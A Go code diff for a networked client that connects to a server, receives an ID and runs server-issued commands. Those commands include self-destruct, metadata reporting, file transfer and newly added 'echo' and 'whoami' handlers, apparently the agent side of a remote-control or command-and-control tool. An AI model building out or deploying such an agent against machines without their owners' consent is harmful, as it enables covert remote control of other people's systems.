@@ -32,6 +32,7 @@ func (c *Client) ClientConnect(){
     fmt.Println(h.K, "Connected to server")
 
 	buffer := make([]byte, 1024)
+
 	bytesRead, err := conn.Read(buffer)
 	if err != nil {
 		fmt.Println(h.E, "Error reading data:", err)
@@ -52,13 +53,17 @@ func (c *Client) ClientConnect(){
 		c.setID(parts[1])
 	}
 
+	go c.checkActive(5, c.Pause)
+	c.Status <- true
+
 	fmt.Println(h.Line)
 	fmt.Println(h.I, "METADATA")
 	fmt.Println(h.I, "Running:", c.OS)
-	fmt.Println(h.I, "Connection:", &c.Conn)
+	fmt.Println(h.I, "Connection:", c.Conn)
 	fmt.Println(h.I, "ID:", c.ID)
 	fmt.Println(h.Line)
-    for {
+    
+	for {
         buffer := make([]byte, 2048)
         bytesRead, err := conn.Read(buffer)
         if err != nil {
@@ -69,6 +74,8 @@ func (c *Client) ClientConnect(){
         command := string(buffer[:bytesRead])
 		
 		c.handleCommand(command, conn)
+		
+		c.Status <- true
     }
 }
 
@@ -92,10 +99,12 @@ func (c *Client) handleCommand(command string, conn net.Conn){
 
 	}else if len(parts) > 2{
 		instr.FileInfo.Name = parts[1]
+		
 		size, err := strconv.ParseInt(parts[2], 10, 64)
 		if err != nil{
 			return
 		}
+		
 		instr.FileInfo.Size = size
 	}
 
@@ -123,6 +132,10 @@ func (c *Client) handleCommand(command string, conn net.Conn){
 			c.selfDestruct(instr)
 		case "metadata":
 			c.sendMetadata(instr)
+		case "echo":
+			c.echo(instr)
+		case "whoami":
+			c.whoami(instr)
 		default:
 			fmt.Println(h.E, "Invalid command")
 	}
